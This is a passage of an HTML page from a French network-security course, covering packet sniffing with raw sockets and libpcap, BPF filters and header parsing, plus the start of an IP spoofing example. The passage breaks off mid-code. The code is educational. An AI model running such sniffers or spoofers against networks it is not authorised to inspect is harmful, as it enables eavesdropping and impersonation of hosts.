<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cours Sécurité Réseaux – FR Intégral</title>
<style>
:root{--bg:#0f1117;--surface:#1a1d27;--card:#22263a;--accent:#4f8ef7;--accent2:#7c5cfc;--green:#2dd4ab;--red:#f87171;--yellow:#fbbf24;--orange:#fb923c;--text:#e8eaf0;--muted:#8891a8;--border:#2e3349;--code-bg:#0d1117;--radius:12px}
*{margin:0;padding:0;box-sizing:border-box}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,sans-serif;line-height:1.75;min-height:100vh}
a{color:var(--accent);text-decoration:none}
code{background:rgba(79,142,247,.12);color:var(--accent2);padding:1px 6px;border-radius:4px;font-size:.87em;font-family:'Courier New',monospace}

/* ===== LAYOUT ===== */
.app-shell{display:flex;height:100vh;overflow:hidden}
.sidebar{width:275px;min-width:275px;background:var(--surface);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;transition:width .3s}
.sidebar.collapsed{width:0;min-width:0;overflow:hidden}
.sidebar-inner{overflow-y:auto;flex:1;padding:10px 0}
.sidebar-header{padding:16px 14px 10px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
.sidebar-header h2{font-size:.8rem;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
.chapter-item{padding:10px 14px;cursor:pointer;transition:all .2s;border-left:3px solid transparent;display:flex;align-items:flex-start;gap:10px}
.chapter-item:hover{background:rgba(79,142,247,.07);border-left-color:rgba(79,142,247,.3)}
.chapter-item.active{background:rgba(79,142,247,.13);border-left-color:var(--accent);color:var(--accent)}
.chapter-icon{font-size:.95rem;min-width:20px;margin-top:2px}
.chapter-label{font-size:.8rem;font-weight:500;line-height:1.35}

/* ===== MAIN ===== */
.main{flex:1;overflow-y:auto;display:flex;flex-direction:column}
.topbar{position:sticky;top:0;z-index:100;background:rgba(15,17,23,.97);backdrop-filter:blur(16px);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.menu-btn{background:none;border:1px solid var(--border);color:var(--text);border-radius:7px;padding:5px 9px;cursor:pointer;font-size:1rem;transition:all .2s}
.menu-btn:hover{background:var(--card);border-color:var(--accent)}
.topbar-title{font-size:.88rem;font-weight:600;flex:1}
.nav-link{background:rgba(124,92,252,.12);border:1px solid rgba(124,92,252,.3);color:var(--accent2);border-radius:7px;padding:5px 11px;font-size:.78rem;font-weight:600;cursor:pointer;transition:all .2s;text-decoration:none;display:inline-flex;align-items:center;gap:5px}
.nav-link:hover{background:rgba(124,92,252,.22);border-color:var(--accent2)}
.search-box{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:6px 12px;color:var(--text);font-size:.8rem;width:190px;outline:none;transition:border-color .2s}
.search-box:focus{border-color:var(--accent)}
.progress-badge{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:4px 12px;font-size:.76rem;color:var(--muted);white-space:nowrap}
.progress-badge span{color:var(--green);font-weight:700}

/* ===== CONTENT ===== */
.content{padding:32px 40px;max-width:920px;width:100%;display:none}
.content.active{display:block}
.chapter-tag{display:inline-flex;align-items:center;gap:6px;background:rgba(79,142,247,.12);color:var(--accent);border:1px solid rgba(79,142,247,.25);border-radius:6px;padding:4px 12px;font-size:.72rem;font-weight:600;text-transform:uppercase;letter-spacing:.07em;margin-bottom:12px}
.chapter-title{font-size:1.9rem;font-weight:700;line-height:1.2;margin-bottom:8px;background:linear-gradient(135deg,var(--text) 40%,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.chapter-desc{color:var(--muted);font-size:.9rem;max-width:750px;margin-bottom:24px;line-height:1.7}

/* ===== SECTION NAV ===== */
.section-nav{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:26px;padding-bottom:16px;border-bottom:1px solid var(--border)}
.sec-btn{background:var(--card);border:1px solid var(--border);color:var(--muted);border-radius:7px;padding:5px 12px;font-size:.75rem;cursor:pointer;font-family:inherit;transition:all .2s}
.sec-btn:hover{border-color:var(--accent);color:var(--accent)}
.sec-btn.active{background:rgba(79,142,247,.15);border-color:var(--accent);color:var(--accent);font-weight:700}
.section-block{display:none}
.section-block.active{display:block}
.section-title{font-size:1.25rem;font-weight:700;margin-bottom:16px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:inline-block}

/* ===== PROSE ===== */
.prose p{margin-bottom:13px;font-size:.9rem;line-height:1.85;color:#d4d8e8}
.prose strong{color:var(--text);font-weight:600}
.prose ul,.prose ol{margin:10px 0 13px 22px;font-size:.9rem;color:#d4d8e8}
.prose li{margin-bottom:6px;line-height:1.75}
h3.sub{font-size:.98rem;font-weight:700;color:var(--accent2);margin:22px 0 10px;padding-left:10px;border-left:3px solid var(--accent2)}
h4.sub2{font-size:.9rem;font-weight:600;color:var(--orange);margin:14px 0 7px}

/* ===== CODE ===== */
.code-block{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;margin:16px 0;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.3)}
.code-label{background:rgba(79,142,247,.08);color:var(--accent);font-size:.7rem;font-weight:700;padding:6px 14px;border-bottom:1px solid var(--border);letter-spacing:.05em;text-transform:uppercase;display:flex;justify-content:space-between;align-items:center}
.code-label .copy-btn{background:rgba(79,142,247,.15);border:none;color:var(--accent);font-size:.7rem;border-radius:4px;padding:2px 8px;cursor:pointer;font-family:inherit;transition:background .2s}
.copy-btn:hover{background:rgba(79,142,247,.3)}
.code-block pre{padding:16px;overflow-x:auto;font-family:'Courier New',Consolas,monospace;font-size:.76rem;line-height:1.6;color:#c9d1d9;white-space:pre;tab-size:4}

/* ===== INFO BOXES ===== */
.info-box{border-radius:10px;padding:15px 17px;margin:16px 0;border-left:4px solid}
.info-box.note{background:rgba(79,142,247,.07);border-color:var(--accent)}
.info-box.warn{background:rgba(251,191,36,.07);border-color:var(--yellow)}
.info-box.danger{background:rgba(248,113,113,.07);border-color:var(--red)}
.info-box.ok{background:rgba(45,212,171,.07);border-color:var(--green)}
.info-box.tip{background:rgba(124,92,252,.07);border-color:var(--accent2)}
.ib-title{font-weight:700;font-size:.79rem;margin-bottom:8px;text-transform:uppercase;letter-spacing:.05em}
.info-box.note .ib-title{color:var(--accent)}
.info-box.warn .ib-title{color:var(--yellow)}
.info-box.danger .ib-title{color:var(--red)}
.info-box.ok .ib-title{color:var(--green)}
.info-box.tip .ib-title{color:var(--accent2)}
.info-box p,.info-box li{font-size:.87rem;color:#d4d8e8;line-height:1.75}
.info-box ul,.info-box ol{margin-left:18px}

/* ===== TABLES ===== */
.dt{width:100%;border-collapse:collapse;margin:14px 0;font-size:.82rem}
.dt th{background:rgba(79,142,247,.12);color:var(--accent);padding:10px 14px;text-align:left;border:1px solid var(--border);font-weight:600}
.dt td{padding:9px 14px;border:1px solid var(--border);color:#d4d8e8;vertical-align:top}
.dt tr:nth-child(even) td{background:rgba(255,255,255,.02)}

/* ===== DIAGRAMS ===== */
.diagram{background:var(--code-bg);border:1px solid var(--border);border-radius:10px;margin:16px 0;padding:20px;overflow-x:auto}
.diagram-title{color:var(--muted);font-size:.74rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:12px;font-weight:600}
.diag-flow{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin:10px 0}
.diag-node{background:rgba(79,142,247,.15);border:1px solid rgba(79,142,247,.4);border-radius:8px;padding:8px 14px;font-size:.79rem;font-weight:600;color:var(--accent);text-align:center;min-width:90px}
.diag-node.server{background:rgba(45,212,171,.12);border-color:rgba(45,212,171,.4);color:var(--green)}
.diag-node.attacker{background:rgba(248,113,113,.12);border-color:rgba(248,113,113,.4);color:var(--red)}
.diag-arrow{font-size:1.3rem;color:var(--muted)}
.diag-seq{display:grid;grid-template-columns:1fr auto 1fr;gap:6px 12px;align-items:center;font-size:.79rem;margin:8px 0}
.diag-seq .step-left{text-align:right;color:var(--accent);font-family:monospace;padding:4px 8px;background:rgba(79,142,247,.08);border-radius:4px}
.diag-seq .step-right{text-align:left;color:var(--green);font-family:monospace;padding:4px 8px;background:rgba(45,212,171,.08);border-radius:4px}
.diag-seq .step-arrow-r{color:var(--accent);font-size:1rem}
.diag-seq .step-arrow-l{color:var(--green);font-size:1rem}
.diag-seq .step-desc{grid-column:1/-1;text-align:center;color:var(--muted);font-size:.74rem;padding:2px}
.mem-diagram{font-family:'Courier New',monospace;font-size:.77rem;line-height:1.55;background:var(--code-bg);padding:14px;border-radius:8px;border:1px solid var(--border)}
.mem-ok{color:var(--green)}
.mem-leak{color:var(--red);font-weight:bold}
.mem-neutral{color:var(--muted)}

/* ===== IMAGES ===== */
.img-card{margin:18px 0;border-radius:12px;overflow:hidden;border:1px solid var(--border);background:var(--code-bg)}
.img-card img{width:100%;height:auto;display:block;cursor:pointer;transition:transform .3s,filter .3s}
.img-card img:hover{transform:scale(1.01);filter:brightness(1.05)}
.img-caption{padding:10px 14px;font-size:.78rem;color:var(--muted);border-top:1px solid var(--border);display:flex;align-items:center;gap:6px}
.img-caption .enlarge-hint{color:var(--accent);font-size:.72rem}
.img-row{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:16px 0}

/* Person card */
.person-card{display:flex;gap:16px;align-items:flex-start;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;margin:16px 0}
.person-img{width:100px;height:100px;border-radius:50%;object-fit:cover;border:2px solid var(--accent);flex-shrink:0}
.person-info h4{font-size:.95rem;font-weight:700;color:var(--text);margin-bottom:4px}
.person-info .person-title{font-size:.78rem;color:var(--accent);margin-bottom:7px}
.person-info p{font-size:.82rem;color:#d4d8e8;line-height:1.65}

/* ===== LIGHTBOX MODAL ===== */
.lightbox{display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.92);align-items:center;justify-content:center;cursor:pointer;backdrop-filter:blur(8px)}
.lightbox.open{display:flex;animation:fadeIn .2s ease}
.lightbox img{max-width:92vw;max-height:90vh;border-radius:10px;box-shadow:0 20px 80px rgba(0,0,0,.8);cursor:default}
.lightbox-close{position:absolute;top:20px;right:24px;color:#fff;font-size:2rem;cursor:pointer;opacity:.7;transition:opacity .2s;line-height:1;background:rgba(255,255,255,.1);border:none;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center}
.lightbox-close:hover{opacity:1}
.lightbox-caption{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);color:rgba(255,255,255,.8);font-size:.83rem;text-align:center;background:rgba(0,0,0,.5);padding:6px 16px;border-radius:20px}

/* ===== GLOSSARY TOOLTIP ===== */
.gloss{border-bottom:1px dashed var(--accent);color:var(--accent);cursor:help;position:relative}
.gloss::after{content:attr(data-tip);position:absolute;bottom:130%;left:50%;transform:translateX(-50%);background:#1a1d27;border:1px solid var(--accent);color:var(--text);font-size:.76rem;padding:8px 12px;border-radius:8px;white-space:normal;width:250px;z-index:100;pointer-events:none;opacity:0;transition:opacity .2s;line-height:1.55;box-shadow:0 4px 20px rgba(0,0,0,.5)}
.gloss:hover::after{opacity:1}

/* Read button */
.read-btn{background:none;border:1px solid var(--border);color:var(--muted);border-radius:8px;padding:6px 14px;font-size:.76rem;cursor:pointer;font-family:inherit;margin-top:22px;transition:all .2s}
.read-btn.done{background:rgba(45,212,171,.1);border-color:var(--green);color:var(--green)}
.read-btn:hover{border-color:var(--green);color:var(--green)}

.no-result{text-align:center;padding:80px 20px;color:var(--muted);font-size:1rem}
::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

@keyframes fadeIn{from{opacity:0}to{opacity:1}}

@media(max-width:768px){
  .sidebar{position:fixed;left:0;top:0;height:100%;z-index:200;width:265px;transform:translateX(-100%);transition:transform .3s}
  .sidebar.mobile-open{transform:translateX(0)}
  .sidebar.collapsed{transform:translateX(-100%)}
  .content{padding:18px 14px}
  .chapter-title{font-size:1.4rem}
  .search-box{width:120px}
  .img-row{grid-template-columns:1fr}
}
</style>

<script>
const ch15={id:"ch15",num:15,icon:"\ud83d\udd0d",title:"Capture et Falsification de Paquets",desc:"Sniffing (écoute clandestine) et Spoofing (usurpation). Implémentation avec libpcap, raw sockets POSIX, Scapy. Concepts : BPF, mode promiscuous, endianness, checksum.",sections:[
    {id:"s15_intro",short:"15.1 Intro + NIC + BPF",title:"15.1 Introduction — NIC et BPF",content:"\n<div class=\"prose\">\n<p>Deux des attaques les plus courantes sur les réseaux sont le <strong>sniffing</strong> (écoute clandestine) et le <strong>spoofing</strong> (usurpation d'identité). Ces deux attaques sont à la base de nombreuses autres attaques sur Internet, telles que l'empoisonnement du cache DNS et le détournement de session TCP.</p>\n<p>Dans le sniffing, les attaquants peuvent écouter clandestinement un réseau physique — filaire ou sans fil — et capturer les paquets transmis sur le réseau. Dans le spoofing, les attaquants peuvent envoyer des paquets sous une fausse identité. Par exemple, ils peuvent envoyer des paquets qui prétendent provenir d'un autre ordinateur.</p>\n</div>\n\n<h3 class=\"sub\">15.1 Comment les paquets sont reçus — La NIC</h3>\n<div class=\"prose\">\n<p>Les machines se connectent aux réseaux via des <strong>Cartes d'Interface Réseau (NIC - Network Interface Card)</strong>. Chaque NIC possède une adresse physique unique, appelée <strong>adresse MAC</strong> (Media Access Control). Les réseaux locaux courants — Ethernet et WiFi — sont des médias de diffusion partagés : chaque NIC entend toutes les trames qui transitent sur le câble ou dans l'air.</p>\n</div>\n\n<div class=\"diagram\">\n<div class=\"diagram-title\">Flux de réception d'un paquet réseau vers une application</div>\n<div class=\"diag-flow\" style=\"flex-direction:column;gap:4px\">\n  <div style=\"display:flex;align-items:center;gap:8px\">\n    <div class=\"diag-node\">Réseau (câble)</div>\n    <div class=\"diag-arrow\">→</div>\n    <div class=\"diag-node\">NIC (Mode Promiscuous)</div>\n    <div class=\"diag-arrow\">→</div>\n    <div class=\"diag-node\">Ring Buffer (DMA)</div>\n  </div>\n  <div style=\"text-align:center;color:var(--muted);font-size:.75rem\">↓ Interruption CPU</div>\n  <div style=\"display:flex;align-items:center;gap:8px\">\n    <div class=\"diag-node\">BPF Filter (noyau)</div>\n    <div class=\"diag-arrow\">→</div>\n    <div class=\"diag-node\">Socket Buffer</div>\n    <div class=\"diag-arrow\">→</div>\n    <div class=\"diag-node server\">Application</div>\n  </div>\n</div>\n</div>\n\n<div class=\"prose\">\n<p>Quand une trame arrive, la NIC vérifie l'adresse de destination :</p>\n<ul>\n<li>Si l'adresse MAC destination = adresse MAC de la NIC → la trame est copiée dans un <strong>Ring Buffer</strong> noyau via <strong>DMA (Direct Memory Access)</strong> puis le CPU est interrompu</li>\n<li>Si l'adresse ne correspond pas → la trame est normalement ignorée (jetée)</li>\n</ul>\n<p><strong>Mode Promiscuous :</strong> En activant ce mode, la NIC accepte et transmet AU NOYAU toutes les trames reçues, qu'elles lui soient destinées ou non. C'est la base du sniffing. Ce mode nécessite les privilèges root.</p>\n<p><strong>Mode Monitor (WiFi) :</strong> L'équivalent du mode promiscuous pour les réseaux sans fil. La carte WiFi capture toutes les trames 802.11 sur le canal écouté, y compris les trames de gestion, de contrôle et de données.</p>\n</div>\n\n<h3 class=\"sub\">15.1.2 Le BSD Packet Filter (BPF)</h3>\n<div class=\"prose\">\n<p>Les sniffers ne s'intéressent généralement qu'à certains types de paquets (ex. uniquement les paquets ICMP, ou uniquement ceux provenant d'une certaine IP). Donner tous les paquets capturés au sniffer — y compris les millions de paquets non pertinents — est extrêmement inefficace.</p>\n<p>Le <strong>BSD Packet Filter (BPF)</strong> permet à un programme en espace utilisateur d'attacher un filtre à un socket. Le filtre est écrit dans un format booléen lisible par l'homme (ex. <code>tcp and dst port 80</code>), compilé en pseudo-code BPF, et interprété par la BPF Pseudo-Machine dans le noyau.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Structure et attachement d'un filtre BPF</div>\n<pre>struct sock_filter code[] = {\n    // Langage machine BPF généré par pcap_compile()\n    {0x28, 0, 0, 0x0000000c},  // A = Ethernet type\n    {0x15, 0, 8, 0x000086dd},  // if A != IPv6, skip\n    // ... autres instructions\n};\nstruct sock_fprog bpf = {\n    .len    = sizeof(code)/sizeof(code[0]),\n    .filter = code,\n};\n// Attacher le filtre BPF au socket :\nsetsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf));\n// Dès lors, le noyau invoque BPF pour chaque paquet reçu.\n// Seuls les paquets correspondant au filtre sont passés à l'application.</pre></div>\n"},
    {id:"s15_sniff",short:"15.2 Sniffing complet",title:"15.2 Capture de Paquets (Sniffing)",content:"\n<div class=\"prose\">\n<p>La capture de paquets consiste à intercepter et inspecter les données en transit sur un réseau. Elle est utilisée légitimement par les administrateurs pour diagnostiquer des problèmes réseau, et illégitimement par les attaquants pour espionner les communications.</p>\n</div>\n\n<h3 class=\"sub\">15.2.1 Réception normale avec les sockets UDP</h3>\n<div class=\"prose\">\n<p>Un programme UDP classique utilise <code>socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)</code>. Le noyau ne transmet que les paquets dont l'IP destination ET le port destination correspondent à ceux sur lesquels le socket est lié (<code>bind()</code>). Tous les autres paquets sont ignorés.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Serveur UDP classique (udp_server.c)</div>\n<pre>#include &lt;arpa/inet.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid main() {\n    struct sockaddr_in server;\n    char buf[1500];\n    \n    // Étape 1 : Créer le socket\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n    \n    // Étape 2 : Configurer l'adresse du serveur\n    memset(&server, 0, sizeof(server));\n    server.sin_family      = AF_INET;\n    server.sin_addr.s_addr = htonl(INADDR_ANY);  // Toutes les interfaces\n    server.sin_port        = htons(9090);          // Port d'écoute\n    \n    // Étape 3 : Lier le socket à l'adresse\n    bind(sock, (struct sockaddr*)&server, sizeof(server));\n    \n    // Étape 4 : Boucle de réception\n    while(1) {\n        recvfrom(sock, buf, sizeof(buf)-1, 0, NULL, NULL);\n        printf(\"Recu: %s\\n\", buf);\n    }\n}\n// Ce serveur ne reçoit QUE les paquets UDP destinés au port 9090.</pre></div>\n\n<h3 class=\"sub\">15.2.2 Sniffing avec les sockets bruts (Raw Sockets)</h3>\n<div class=\"prose\">\n<p>Pour capter tous les paquets du réseau (comme le fait Wireshark), on utilise un <strong>socket brut (SOCK_RAW)</strong> avec le protocole <code>ETH_P_ALL</code>. Cela demande à l'OS de transmettre une copie de chaque paquet reçu au programme, en incluant les en-têtes de la couche liaison de données.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Sniffer avec socket brut POSIX (sniff_raw.c)</div>\n<pre>#include &lt;linux/if_packet.h&gt;\n#include &lt;net/ethernet.h&gt;\n#include &lt;stdio.h&gt;\n\n#define PACKET_LEN 512\n\nint main() {\n    char buffer[PACKET_LEN];\n    \n    // Étape 1 : Créer un socket brut\n    // AF_PACKET = accès direct à la couche liaison\n    // SOCK_RAW  = inclure les en-têtes dans les données reçues\n    // ETH_P_ALL = capturer TOUS les protocoles\n    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\n    \n    // Étape 2 : Activer le mode promiscuous\n    struct packet_mreq mr;\n    memset(&mr, 0, sizeof(mr));\n    mr.mr_ifindex = 2;              // Index de l'interface réseau\n    mr.mr_type    = PACKET_MR_PROMISC;\n    setsockopt(sock, SOL_PACKET, PACKET_ADD_MEMBERSHIP,\n               &mr, sizeof(mr));\n    \n    // Étape 3 : Boucle de capture\n    while(1) {\n        int n = recvfrom(sock, buffer, PACKET_LEN, 0, NULL, NULL);\n        if(n > 0)\n            printf(\"Paquet capturé : %d octets\\n\", n);\n    }\n    return 0;\n}\n// À compiler et exécuter avec : sudo gcc -o sniff sniff_raw.c && sudo ./sniff</pre></div>\n\n<h3 class=\"sub\">15.2.3 Sniffing professionnel avec l'API pcap</h3>\n<div class=\"prose\">\n<p>L'API <strong>pcap (libpcap)</strong> est une bibliothèque portable d'abstraction pour la capture de paquets réseau. Elle est utilisée par Wireshark, tcpdump, Snort, et la plupart des outils d'analyse réseau. Elle offre :</p>\n<ul>\n<li>Un compilateur de filtres BPF (accepte des expressions lisibles)</li>\n<li>Une interface cohérente sur Linux, macOS, Windows (WinPcap)</li>\n<li>Des fonctions de traitement des paquets capturés</li>\n</ul>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Sniffer complet avec libpcap (sniff_pcap.c)</div>\n<pre>#include &lt;pcap.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;stdio.h&gt;\n\n// En-tête Ethernet (14 octets)\nstruct ethheader {\n    u_char ether_dhost[6]; // Adresse MAC destination\n    u_char ether_shost[6]; // Adresse MAC source\n    u_short ether_type;    // Type : 0x0800=IPv4, 0x0806=ARP\n};\n\n// Callback invoquée pour chaque paquet capturé\nvoid got_packet(u_char *args, const struct pcap_pkthdr *header,\n                const u_char *packet) {\n    struct ethheader *eth = (struct ethheader *)packet;\n    \n    if(ntohs(eth->ether_type) == 0x0800) { // Paquet IPv4\n        // En-tête IP commence après l'en-tête Ethernet\n        struct ipheader *ip = (struct ipheader *)(packet +\n                               sizeof(struct ethheader));\n        \n        printf(\"\\nSource IP      : %s\\n\", inet_ntoa(ip->iph_sourceip));\n        printf(\"Destination IP : %s\\n\", inet_ntoa(ip->iph_destip));\n        printf(\"Protocole      : %d\\n\", ip->iph_protocol);\n    }\n}\n\nint main() {\n    pcap_t    *handle;\n    char       errbuf[PCAP_ERRBUF_SIZE];\n    struct     bpf_program fp;\n    bpf_u_int32 net, mask;\n    \n    char filter[] = \"ip proto icmp\"; // N'attraper que les paquets ICMP\n    char iface[]  = \"enp0s3\";        // Interface réseau à écouter\n    \n    // Étape 1 : Obtenir l'IP et le masque de l'interface\n    pcap_lookupnet(iface, &net, &mask, errbuf);\n    \n    // Étape 2 : Ouvrir la session de capture\n    // BUFSIZ = taille du buffer, 1 = mode promiscuous, 1000 = timeout ms\n    handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);\n    \n    // Étape 3 : Compiler et appliquer le filtre BPF\n    pcap_compile(handle, &fp, filter, 0, net);\n    pcap_setfilter(handle, &fp);\n    \n    // Étape 4 : Boucle de capture (-1 = indéfiniment)\n    pcap_loop(handle, -1, got_packet, NULL);\n    \n    pcap_close(handle);\n    return 0;\n}\n// Compilation : gcc -o sniff sniff_pcap.c -lpcap\n// Exécution   : sudo ./sniff</pre></div>\n\n<div class=\"info-box note\"><div class=\"ib-title\">📝 Exemples de filtres pcap courants</div>\n<table class=\"dt\" style=\"margin:8px 0\">\n<tr><th>Filtre</th><th>Signification</th></tr>\n<tr><td><code>dst host 10.0.2.5</code></td><td>Paquets dont la destination IP est 10.0.2.5</td></tr>\n<tr><td><code>src host 10.0.2.6</code></td><td>Paquets dont la source IP est 10.0.2.6</td></tr>\n<tr><td><code>host 10.0.2.6 and src port 9090</code></td><td>Paquets IP = 10.0.2.6 ET port source = 9090</td></tr>\n<tr><td><code>proto icmp</code></td><td>Paquets ICMP uniquement</td></tr>\n<tr><td><code>proto tcp and dst port 80</code></td><td>TCP vers le port 80 (HTTP)</td></tr>\n<tr><td><code>not src host 10.0.2.1</code></td><td>Tout sauf les paquets venant de 10.0.2.1</td></tr>\n</table></div>\n\n<h3 class=\"sub\">15.2.4 Analyse des données du paquet capturé</h3>\n<div class=\"prose\">\n<p>Lorsque <code>got_packet()</code> est appelée, le 3e argument est un pointeur vers le buffer contenant la trame Ethernet complète. Pour analyser les en-têtes, on utilise le <strong>cast de pointeurs vers des structures C</strong> qui mapent directement les champs de l'en-tête :</p>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Disposition en mémoire d'une trame Ethernet contenant un paquet IP/ICMP</div>\n<div class=\"mem-diagram\">\n<span class=\"mem-ok\">|------- En-tête Ethernet (14 octets) -------|</span>\n<span class=\"mem-ok\">| MAC dst (6) | MAC src (6) | Type (2=0x0800)|</span>\n<span class=\"mem-neutral\">|------- En-tête IP (20 octets minimum) ------|</span>\n<span class=\"mem-neutral\">| Ver|IHL|TOS|Len | ID | Flags+Offset       |</span>\n<span class=\"mem-neutral\">| TTL |Proto|Checksum| IP Source           |</span>\n<span class=\"mem-neutral\">| IP Destination                             |</span>\n<span class=\"mem-leak\">|------- En-tête ICMP (8 octets) -------------|</span>\n<span class=\"mem-leak\">| Type | Code | Checksum | ID | Séquence     |</span>\n<span class=\"mem-neutral\">|------- Données ICMP (variable) ------------|</span>\n</div></div>\n<div class=\"code-block\"><div class=\"code-label\">Structures C pour analyser les en-têtes</div>\n<pre>// En-tête IP (20 octets sans options)\nstruct ipheader {\n    unsigned char  iph_ihl:4;       // Longueur en-tête (en mots de 4 octets)\n    unsigned char  iph_ver:4;       // Version IP (toujours 4)\n    unsigned char  iph_tos;         // Type of Service\n    unsigned short iph_len;         // Longueur totale du paquet\n    unsigned short iph_ident;       // Identifiant (pour la fragmentation)\n    unsigned short iph_flag;        // Flags + Offset de fragment\n    unsigned char  iph_ttl;         // Time To Live\n    unsigned char  iph_protocol;    // Protocole suivant (6=TCP, 17=UDP, 1=ICMP)\n    unsigned short iph_chksum;      // Somme de contrôle\n    struct in_addr iph_sourceip;    // Adresse IP source\n    struct in_addr iph_destip;      // Adresse IP destination\n};\n\n// En-tête ICMP (8 octets)\nstruct icmpheader {\n    unsigned char  icmp_type;    // 0=Echo Reply, 8=Echo Request\n    unsigned char  icmp_code;    // Sous-type\n    unsigned short icmp_chksum;  // Checksum ICMP\n    unsigned short icmp_id;      // Identifiant (pour associer req/rep)\n    unsigned short icmp_seq;     // Numéro de séquence\n};\n\n// Utilisation dans got_packet() :\nvoid got_packet(u_char *args, const struct pcap_pkthdr *hdr,\n                const u_char *pkt) {\n    // Couche 2 (Ethernet) : commence au début\n    struct ethheader *eth = (struct ethheader *)pkt;\n    \n    // Couche 3 (IP) : après l'en-tête Ethernet (14 octets)\n    struct ipheader *ip = (struct ipheader *)(pkt +\n                           sizeof(struct ethheader));\n    \n    // Couche 3+ (ICMP) : après IP (20 octets)\n    int ip_header_len = ip->iph_ihl * 4; // ihl = nb de mots de 4 octets\n    struct icmpheader *icmp = (struct icmpheader *)(\n        (u_char*)ip + ip_header_len);\n    \n    if(ip->iph_protocol == IPPROTO_ICMP) {\n        printf(\"ICMP : %s -> %s  type=%d\\n\",\n               inet_ntoa(ip->iph_sourceip),\n               inet_ntoa(ip->iph_destip),\n               icmp->icmp_type);\n    }\n}</pre></div>\n"},
    {id:"s15_spoof",short:"15.3 Spoofing complet",title:"15.3 Falsification de Paquets (Spoofing)",content:"\n<div class=\"prose\">\n<p>Avec la programmation socket classique, l'OS remplit automatiquement les champs de l'en-tête IP : adresse IP source (propre machine), TTL, identification, etc. Le programmeur n'a accès qu'aux données au niveau de la couche application.</p>\n<p>Le <strong>spoofing</strong> permet d'envoyer des paquets avec des valeurs arbitraires dans les en-têtes IP, TCP, UDP ou ICMP — notamment l'<strong>adresse IP source falsifiée</strong>. Cela est rendu possible par les <strong>raw sockets</strong> avec l'option <code>IP_HDRINCL</code>.</p>\n</div>\n\n<h3 class=\"sub\">15.3.1 Option IP_HDRINCL — Contrôle total</h3>\n<div class=\"prose\">\n<p>Quand l'option <code>IP_HDRINCL</code> est activée sur un socket brut, le programme doit construire lui-même l'entièreté de l'en-tête IP (et les en-têtes suivants). L'OS ne remplit plus rien — tout est sous le contrôle du programmeur.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Fonction d'envoi de paquet IP brut</div>\n<pre>/* Envoie un paquet IP complet (avec son en-tête) sur le réseau */\nvoid send_raw_ip_packet(struct ipheader *ip) {\n    struct sockaddr_in dest_info;\n    int enable = 1;\n    \n    // Étape 1 : Créer un socket brut IP\n    // IPPROTO_RAW = permet d'envoyer des paquets IP bruts\n    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\n    if(sock < 0) { perror(\"socket\"); return; }\n    \n    // Étape 2 : Activer IP_HDRINCL\n    // Le programme fournit lui-même l'en-tête IP complet\n    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));\n    \n    // Étape 3 : Configurer l'adresse de destination\n    memset(&dest_info, 0, sizeof(dest_info));\n    dest_info.sin_family = AF_INET;\n    dest_info.sin_addr   = ip->iph_destip; // Destination du paquet\n    \n    // Étape 4 : Envoyer le paquet complet\n    // L'en-tête IP + les couches supérieures sont dans le buffer pointé par ip\n    sendto(sock, ip, ntohs(ip->iph_len), 0,\n           (struct sockaddr *)&dest_info, sizeof(dest_info));\n    \n    close(sock);\n}</pre></div>\n\n<div class=\"info-box danger\"><div class=\"ib-title\">⚠️ Privilèges Root requis</div>\n<p>La création de sockets bruts (<code>SOCK_RAW</code>) nécessite les privilèges root ou la capacité Linux <code>CAP_NET_RAW</code>. Sans ces droits, le système retourne <code>EPERM (Permission denied)</code>. Toujours lancer avec <code>sudo</code>.</p></div>\n\n<h3 class=\"sub\">15.3.3 Spoofing d'un paquet ICMP Echo Request</h3>\n<div class=\"prose\">\n<p>Exemple complet : envoyer un paquet ICMP Echo Request (ping) avec une adresse IP source falsifiée. La cible recevra le ping et croira qu'il vient d'une adresse inexistante (1.2.3.4) et enverra sa réponse vers cette adresse fantôme.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Construire et envoyer un paquet ICMP falsifié</div>\n<pre>#include &lt;string.h&gt;\n#include &lt;arpa/inet.h&gt;\n\n// Calcul de la somme de contrôle (RFC 1071)\nunsigned short in_cksum(unsigned short *buf, int length) {\n    unsigned short *w = buf;\n    int            nleft = length;\n    int            sum   = 0;\n    unsigned short 